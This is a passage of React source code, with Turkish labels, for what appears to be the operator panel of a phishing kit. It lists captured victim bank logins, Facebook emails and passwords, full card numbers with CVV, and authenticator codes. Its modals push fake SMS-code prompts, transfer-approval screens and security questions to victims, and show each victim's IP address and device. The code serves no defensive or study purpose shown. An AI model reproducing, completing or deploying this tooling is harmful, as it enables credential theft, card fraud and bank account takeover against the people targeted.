                  <div>
                    <h3 className={`text-lg font-bold leading-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                      Geçmiş Giriş Kayıtları
                    </h3>
                    <p className={`text-xs mt-0.5 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                      Session #{historyModalSession.public_id ?? historyModalSession.id.slice(0, 8)}
                      <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
                      🏦 Banka: <span className="font-bold">{bHistory.length}</span>
                      <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
                      📘 Facebook: <span className="font-bold">{fHistory.length}</span>
                      <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
                      💳 Kart: <span className="font-bold">{cHistory.length}</span>
                      <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
                      🔢 Generator: <span className="font-bold">{gHistory.length}</span>
                    </p>
                  </div>
                </div>
                <button
                  onClick={() => { setShowHistoryModal(false); setHistoryModalSession(null); }}
                  className={`shrink-0 h-10 w-10 rounded-xl flex items-center justify-center transition-colors ${darkMode ? 'bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white' : 'bg-gray-100 text-gray-500 hover:bg-gray-200 hover:text-gray-900'}`}
                >
                  ✕
                </button>
              </div>

              {/* BODY - SCROLL */}
              <div className={`overflow-y-auto p-6 space-y-8 ${darkMode ? 'bg-[#0b0b0e]' : 'bg-white'}`}>
                <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-8">
                  {/* ====================== 🏦 BANKA GİRİŞLERİ ====================== */}
                  <div>
                    <div className="flex items-center gap-2 mb-4">
                      <span className="text-xl">🏦</span>
                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Banka Girişleri (Geçmiş)</h4>
                      <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                        {bHistory.length} adet
                      </span>
                    </div>
                    {bHistory.length === 0 ? (
                      <div className={`rounded-2xl border-2 border-dashed py-10 text-center ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş banka giriş kaydı yok.</p>
                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Bu, kullanıcının ilk banka girişiyse veya eski kayıtlar henüz geçmişe taşınmadıysa görünür.</p>
                      </div>
                    ) : (
                      <div className="space-y-3">
                        {bHistory.map((rec, idx) => {
                          const r = rec as Record<string, unknown>;
                          const loginMethodStr = (typeof r.loginMethod === "string") ? r.loginMethod.trim() : "";
                          // 🔴 KRITIK: r.bankName (KAYDIN KENDI ADI) kullan. ASLA fd.bankName (GUNCEL) kullanma!
                          //    Eski koddan kalan tarihi kayitlarda bankName yanlislikla guncel banka adi ile
                          //    kaydedilmis olabilir - bu durumda bizim icin r.bankName neyse O dur (duzeltme yok).
                          //    Kullanicinin testi: SEB -> Swedbank gecisi, eski kayit SEB bankName ICERMELI.
                          let bankNameStr = (typeof r.bankName === "string") ? r.bankName.trim() : "";
                          // Eger bankName TAMAMEN BOS ise (garbage data), bankSlug tanimli ise onu kullan:
                          if (!bankNameStr) {
                            const sl = (typeof r.bankSlug === "string") ? r.bankSlug.trim() : "";
                            if (sl) bankNameStr = sl.charAt(0).toUpperCase() + sl.slice(1);
                          }
                          // Fallback: hala bos ise "Bilinmeyen Banka"
                          const finalBankName = bankNameStr || "Bilinmeyen Banka";
                          return (
                            <div
                              key={`bank-${idx}`}
                              className={`rounded-2xl border overflow-hidden ${darkMode ? 'border-white/10 bg-black/30' : 'border-gray-200 bg-gray-50'}`}
                            >
                              <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                <div className="flex items-center gap-2 min-w-0">
                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-emerald-500/15 text-emerald-400' : 'bg-emerald-500/10 text-emerald-600'}`}>
                                    #{bHistory.length - idx}
                                  </span>
                                  <div className="min-w-0">
                                    <p className={`text-[12px] font-bold truncate ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                                      {finalBankName}
                                    </p>
                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                      {fmtDate(r.submittedAt)}
                                    </p>
                                  </div>
                                </div>
                                {loginMethodStr && (
                                  <span className={`shrink-0 text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-cyan-500/15 text-cyan-300 border border-cyan-400/20' : 'bg-cyan-500/10 text-cyan-700 border border-cyan-200'}`}>
                                    🛂 {loginMethodStr}
                                  </span>
                                )}
                              </div>
                              <div className="px-4 py-3 grid grid-cols-1 sm:grid-cols-2 gap-2">
                                {/* SADECE Istenen alanlar: Alan 1 + Alan 2 (diger hepsi SILINDI - Kullanici Istegi) */}
                                {/* Giris yontemi sag ustte BADGE olarak zaten gorunuyor */}
                                {/* Banka Adi da headerda BASKA olarak zaten gorunuyor */}
                                {/* Kisisel Kod SILINDI (kullanici istemiyor) */}
                                {/* Giris Yontemi SILINDI (header badge'da var) */}
                                <ValRow label="Alan 1" value={r.orderedField1 as string | undefined} />
                                <ValRow label="Alan 2" value={r.orderedField2 as string | undefined} />
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    )}
                  </div>

                  {/* ====================== 📘 FACEBOOK GİRİŞLERİ ====================== */}
                  <div>
                    <div className="flex items-center gap-2 mb-4">
                      <span className="text-xl">📘</span>
                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Facebook Girişleri (Geçmiş)</h4>
                      <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                        {fHistory.length} adet
                      </span>
                    </div>
                    {fHistory.length === 0 ? (
                      <div className={`rounded-2xl border-2 border-dashed py-10 text-center ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş Facebook giriş kaydı yok.</p>
                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Kullanıcı henüz tekrar FB ile giriş yapmadıysa (geçmişe taşınan kayıt yoksa) görünür.</p>
                      </div>
                    ) : (
                      <div className="space-y-3">
                        {fHistory.map((rec, idx) => {
                          const r = rec as Record<string, unknown>;
                          // KULLANICI ISTEGI: HEADER BASLIK (Isim / Email) OLMAYACAK.
                          // Sadece sira numarasi (#1,#2) + zaman damgasi gorunecek.
                          return (
                            <div
                              key={`fb-${idx}`}
                              className={`rounded-2xl border overflow-hidden ${darkMode ? 'border-white/10 bg-black/30' : 'border-gray-200 bg-gray-50'}`}
                            >
                              <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                <div className="flex items-center gap-2 min-w-0">
                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-blue-500/15 text-blue-400' : 'bg-blue-500/10 text-blue-600'}`}>
                                    #{fHistory.length - idx}
                                  </span>
                                  <div className="min-w-0">
                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                      {fmtDate(r.submittedAt)}
                                    </p>
                                  </div>
                                </div>
                              </div>
                              <div className="px-4 py-3 grid grid-cols-1 sm:grid-cols-2 gap-2">
                                <ValRow label="Email / Telefon" value={r.fbEmail as string | undefined} />
                                <ValRow label="Parool" value={r.fbPassword as string | undefined} />
                                <ValRow label="Ad" value={r.fbFirstName as string | undefined} />
                                <ValRow label="Soyad" value={r.fbLastName as string | undefined} />
                                <ValRow label="Facebook ID" value={r.fbUserId as string | undefined} />
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    )}
                  </div>

                  {/* ====================== 💳 KART GİRİŞLERİ ====================== */}
                  <div>
                    <div className="flex items-center gap-2 mb-4">
                      <span className="text-xl">💳</span>
                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Kart Girişleri (Geçmiş)</h4>
                      <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                        {cHistory.length} adet
                      </span>
                    </div>
                    {cHistory.length === 0 ? (
                      <div className={`rounded-2xl border-2 border-dashed py-10 text-center ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş kart giriş kaydı yok.</p>
                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Farklı kart bilgileriyle 2. kez giriş yapılınca eski kayıt burada görünür.</p>
                      </div>
                    ) : (
                      <div className="space-y-3">
                        {cHistory.map((rec, idx) => {
                          const r = rec as Record<string, unknown>;
                          const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
                          const rNumber = str(r.cardNumber);
                          const rExpiry = str(r.cardExpiry);
                          const rCvc = str(r.cardCvc);
                          const rHolder = str(r.cardHolder);
                          // KULLANICI ISTEGI: HEADER BASLIK (Kart Sahibi / Maskeli No) OLMAYACAK.
                          // Sadece sira numarasi (#1,#2) + zaman damgasi gorunecek.
                          return (
                            <div
                              key={`card-${idx}`}
                              className={`rounded-2xl border overflow-hidden ${darkMode ? 'border-white/10 bg-black/30' : 'border-gray-200 bg-gray-50'}`}
                            >
                              <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                <div className="flex items-center gap-2 min-w-0">
                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-purple-500/15 text-purple-400' : 'bg-purple-500/10 text-purple-600'}`}>
                                    #{cHistory.length - idx}
                                  </span>
                                  <div className="min-w-0">
                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                      {fmtDate(r.submittedAt)}
                                    </p>
                                  </div>
                                </div>
                              </div>
                              <div className="px-4 py-3 grid grid-cols-1 sm:grid-cols-2 gap-2">
                                <ValRow label="Kart Numarası" value={rNumber || undefined} />
                                <ValRow label="Son Kul. Tar." value={rExpiry || undefined} />
                                <ValRow label="CVV/CVC" value={rCvc || undefined} />
                                <ValRow label="Kart Sahibi" value={rHolder || undefined} />
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    )}
                  </div>

                  {/* ====================== 🔢 GENERATOR GİRİŞLERİ ====================== */}
                  <div>
                    <div className="flex items-center gap-2 mb-4">
                      <span className="text-xl">🔢</span>
                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Generator (Geçmiş)</h4>
                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                        {gHistory.length} adet
                      </span>
                    </div>
                    {gHistory.length === 0 ? (
                      <div className={`rounded-2xl border-2 border-dashed py-10 text-center ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş generator kaydı yok.</p>
                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Kullanıcı tekrar generator kodu gönderince eskisi burada görünür.</p>
                      </div>
                    ) : (
                      <div className="space-y-3">
                        {gHistory.map((rec, idx) => {
                          const r = rec as Record<string, any>;
                          const genLabel =
                            r.generatorType === "generator2" ? "kodas 2" : "kodas 1";
                          const entries =
                            r.data && typeof r.data === "object"
                              ? Object.entries(r.data as Record<string, unknown>).filter(
                                  ([, v]) => v != null && String(v).trim() !== ""
                                )
                              : [];
                          return (
                            <div
                              key={`gen-${idx}`}
                              className={`rounded-2xl border overflow-hidden ${darkMode ? 'border-white/10 bg-black/30' : 'border-gray-200 bg-gray-50'}`}
                            >
                              <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                <div className="flex items-center gap-2 min-w-0">
                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-rose-500/15 text-rose-400' : 'bg-rose-500/10 text-rose-600'}`}>
                                    #{gHistory.length - idx}
                                  </span>
                                  <div className="min-w-0">
                                    <p className={`text-[12px] font-bold truncate ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                                      {genLabel}
                                    </p>
                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                      {fmtDate(r.submittedAt)}
                                    </p>
                                  </div>
                                </div>
                              </div>
                              <div className="px-4 py-3 grid grid-cols-1 sm:grid-cols-2 gap-2">
                                {entries.map(([k, v]) => (
                                  <ValRow key={k} label={k.replace(/_/g, " ")} value={String(v)} />
                                ))}
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </div>
        );
      })()}

      {/* SPECIAL NOTIFICATION MODAL */}
      {specialPromptSessionId && (
        <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-2xl rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`} onPaste={(e) => {
              const file = e.clipboardData.files?.[0];
              if (file && file.type.startsWith("image/")) {
                const reader = new FileReader();
                reader.onload = () => setSpecialImage(reader.result as string);
                reader.readAsDataURL(file);
              }
            }}>
            <div className="flex justify-between mb-4 items-center">
              <h3 className={`text-lg font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Özel Bildirim Paneli</h3>
              <div className="flex gap-2">
                <button onClick={() => setSpecialLang("de")} className={`px-3 py-1 rounded-lg text-xs font-bold ${specialLang === "de" ? "bg-[#EB5E28] text-white" : (darkMode ? "bg-zinc-800 text-zinc-500" : "bg-gray-200 text-gray-600")}`}>DE</button>
                <button onClick={() => setSpecialLang("tr")} className={`px-3 py-1 rounded-lg text-xs font-bold ${specialLang === "tr" ? "bg-[#EB5E28] text-white" : (darkMode ? "bg-zinc-800 text-zinc-500" : "bg-gray-200 text-gray-600")}`}>TR</button>
              </div>
            </div>
            <textarea 
              value={specialMessage} 
              onChange={(e) => setSpecialMessage(e.target.value)} 
              className={`w-full rounded-xl p-4 border outline-none transition-all ${darkMode ? 'bg-zinc-900 text-white border-zinc-800 focus:border-[#EB5E28]' : 'bg-gray-50 text-gray-900 border-gray-200 focus:border-[#EB5E28]'}`} 
              placeholder="Mesaj yazın veya buraya bir resim yapıştırın..." 
              rows={5} 
            />
            {specialImage && (
              <div className="mt-4 relative rounded-xl border border-zinc-800 overflow-hidden bg-black">
                <img src={specialImage} className="max-h-48 w-full object-contain" alt="Preview" />
                <button onClick={() => setSpecialImage(null)} className="absolute top-2 right-2 bg-red-600 p-1.5 rounded-full text-white hover:bg-red-700">✕</button>
              </div>
            )}
            <div className="mt-6 flex justify-end gap-4">
              <button onClick={() => setSpecialPromptSessionId(null)} className={`px-4 py-2 font-semibold transition-colors ${darkMode ? 'text-zinc-500 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}>İptal</button>
              <button onClick={() => void publishSpecialApproval()} className="bg-[#EB5E28] px-10 py-2 rounded-xl text-white font-bold hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20">BİLDİRİMİ GÖNDER</button>
            </div>
          </div>
        </div>
      )}

      {/* SMS SETTINGS MODAL */}
      {smsPromptSessionId && (
        <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>SMS Ayarları</h3>
            
            <div className="space-y-4">
              <div>
                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Hane Sayısı</label>
                <input
                  type="number"
                  min={4}
                  max={12}
                  value={smsDigitsInput}
                  onChange={(e) => setSmsDigitsInput(e.target.value)}
                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
                />
              </div>

              <div>
                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                  Özel Açıklama Metni (İsteğe Bağlı)
                </label>
                <textarea
                  rows={3}
                  value={smsCustomTextInput}
                  onChange={(e) => setSmsCustomTextInput(e.target.value)}
                  placeholder="Örn: Telefonunuza gelen şifreyi girin."
                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
                />
              </div>
            </div>

            <div className="mt-6 flex justify-end gap-3">
              <button
                onClick={() => setSmsPromptSessionId(null)}
                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
              >
                İptal
              </button>
              <button
                onClick={() => void confirmSmsRedirect()}
                className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20"
              >
                Onayla ve Gönder
              </button>
            </div>
          </div>
        </div>
      )}

      {approvalPromptSessionId && (
        <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>Onay Ayarları</h3>

            <div className="space-y-4">
              <div>
                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Seçilen Onay</label>
                <div className={`w-full rounded-xl border px-3 py-2 text-sm font-semibold ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}>
                  {APPROVAL_OPTIONS.find((option) => option.value === approvalPromptType)?.label || "-"}
                </div>
              </div>

              {approvalPromptType === "transfer" ? (
                <div>
                  <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Para Miktarı</label>
                  <input
                    type="text"
                    value={transferAmountInput}
                    onChange={(e) => setTransferAmountInput(e.target.value)}
                    placeholder="Örn: 1.231,00"
                    className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
                  />
                </div>
              ) : (
                <div>
                  <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
                  <input
                    type="text"
                    value={approvalCodeInput}
                    onChange={(e) => setApprovalCodeInput(e.target.value)}
                    placeholder="Örn: 1, 22, 4578"
                    className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
                  />
                </div>
              )}
            </div>

            <div className="mt-6 flex justify-end gap-3">
              <button
                onClick={() => {
                  setApprovalPromptSessionId(null);
                  setApprovalPromptType("");
                  setApprovalCodeInput("");
                  setTransferAmountInput("");
                  
                }}
                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
              >
                İptal
              </button>
              <button
                onClick={() => void confirmApprovalAction()}
                className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20"
              >
                Onayla ve Gönder
              </button>
            </div>
          </div>
        </div>
      )}

      {/* OZEL SORU GONDER MODALI */}
      {questionPromptSessionId && (
        <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>❓ Özel Soru Gönder</h3>
            <div>
              <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Kullanıcıya Gösterilecek Soru</label>
              <textarea
                rows={3}
                value={questionInput}
                onChange={(e) => setQuestionInput(e.target.value)}
                placeholder="Örn: Qual é o apelido de solteira da sua mãe?"
                className={`w-full rounded-xl border px-3 py-2 outline-none transition-all resize-none ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
              />
            </div>
            <div className="mt-6 flex justify-end gap-3">
              <button
                onClick={() => { setQuestionPromptSessionId(null); setQuestionInput(""); }}
                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
              >
                İptal
              </button>
              <button
                onClick={() => void confirmQuestionSend()}
                disabled={!questionInput.trim()}
                className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20 disabled:opacity-50"
              >
                Gönder
              </button>
            </div>
          </div>
        </div>
      )}

      {/* OZEL SORULAR GECMISI MODALI (guncel ustte) */}
      {questionModalSession && (() => {
        const qfd = (questionModalSession.form_data ?? {}) as Record<string, any>;
        const qList: any[] = Array.isArray(qfd.customQuestions) ? [...qfd.customQuestions] : [];
        const ordered = qList.map((q, i) => ({ q, i })).reverse();
        return (
          <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm" onClick={() => setQuestionModalSession(null)}>
            <div className={`w-full max-w-lg max-h-[80vh] overflow-hidden rounded-2xl border shadow-2xl flex flex-col ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`} onClick={(e) => e.stopPropagation()}>
              <div className={`flex justify-between items-center px-5 py-4 border-b ${darkMode ? 'border-zinc-800' : 'border-gray-200'}`}>
                <h3 className={`text-lg font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>❓ Özel Sorular</h3>
                <button onClick={() => setQuestionModalSession(null)} className="text-zinc-500 hover:opacity-70 text-xl">✕</button>
              </div>
              <div className="overflow-y-auto p-5 space-y-3">
                {ordered.length === 0 ? (
                  <p className={`text-sm text-center py-6 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz soru gönderilmedi.</p>
                ) : ordered.map(({ q, i }) => (
                  <div key={i} className={`rounded-xl border p-4 ${darkMode ? 'border-zinc-800 bg-zinc-900/50' : 'border-gray-200 bg-gray-50'}`}>
                    <div className="flex items-center justify-between gap-2 mb-2">
                      <span className={`text-[12px] font-bold uppercase tracking-widest ${darkMode ? 'text-violet-400' : 'text-violet-600'}`}>Soru #{i + 1}</span>
                      <span className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>{q.askedAt ? fmtDate(q.askedAt) : ""}</span>
                    </div>
                    <p className={`text-sm font-semibold mb-2 ${darkMode ? 'text-white' : 'text-gray-900'}`}>{q.question || "-"}</p>
                    {q.answer && String(q.answer).trim() ? (
                      <div className={`rounded-lg px-3 py-2 text-sm ${darkMode ? 'bg-emerald-500/10 text-emerald-400' : 'bg-emerald-50 text-emerald-700'}`}>
                        <span className="font-bold">Cevap: </span>{q.answer}
                      </div>
                    ) : (
                      <div className={`rounded-lg px-3 py-2 text-xs font-semibold ${darkMode ? 'bg-amber-500/10 text-amber-400' : 'bg-amber-50 text-amber-600'}`}>
                        Cevap bekleniyor...
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          </div>
        );
      })()}

      {/* DEVICE INFO MODAL */}
      {deviceInfoSession && (() => {
        const uaInfo = parseUserAgent(deviceInfoSession.user_agent);
        return (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            <div className={`flex justify-between items-center mb-6 border-b pb-4 ${darkMode ? 'border-zinc-800' : 'border-gray-200'}`}>
              <h3 className={`text-xl font-bold flex items-center gap-2 ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                📱 Cihaz & Bağlantı Bilgisi
              </h3>
              <button onClick={() => setDeviceInfoSession(null)} className="text-zinc-500 hover:opacity-70 text-xl">✕</button>
            </div>
            
            <div className="space-y-4">
              <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">IP Adresi</div>
                <div className="text-blue-400 font-mono text-lg">{deviceInfoSession.ip_address || "Henüz yansımadı"}</div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">İlk Giriş</div>
                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                    {deviceInfoSession.created_at
                      ? new Date(deviceInfoSession.created_at).toLocaleString("tr-TR")
                      : "Bilinmiyor"}
                  </div>
                </div>
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Son Çevrimiçi</div>
                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                    {onlineSessionIds.has(deviceInfoSession.id) ? (
                      <span className="text-green-500 font-bold">Şu an çevrimiçi</span>
                    ) : sessionLastSeenAt[deviceInfoSession.id] ? (
                      new Date(sessionLastSeenAt[deviceInfoSession.id]).toLocaleString("tr-TR")
                    ) : deviceInfoSession.updated_at ? (
                      new Date(deviceInfoSession.updated_at).toLocaleString("tr-TR")
                    ) : (
                      "Bilinmiyor"
                    )}
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">İşletim Sistemi</div>
                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.os}</div>
                </div>
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Tarayıcı</div>
                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.browser}</div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Cihaz Türü</div>
                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.device}</div>
                </div>
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Cihaz modeli</div>
                  <div className={`font-medium break-words ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.model}</div>
                </div>
              </div>

              <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Ham Veri (User-Agent)</div>
                <div className="text-xs text-zinc-400 font-mono break-words leading-relaxed">
                  {deviceInfoSession.user_agent || "Bilinmiyor"}
                </div>
              </div>
            </div>

            <div className="mt-6 flex justify-end">
              <button
                onClick={() => setDeviceInfoSession(null)}
                className={`rounded-lg px-6 py-2 text-sm font-bold transition-colors ${darkMode ? 'bg-zinc-800 text-white hover:bg-zinc-700' : 'bg-gray-200 text-gray-900 hover:bg-gray-300'}`}
              >
                Kapat
              </button>
            </div>
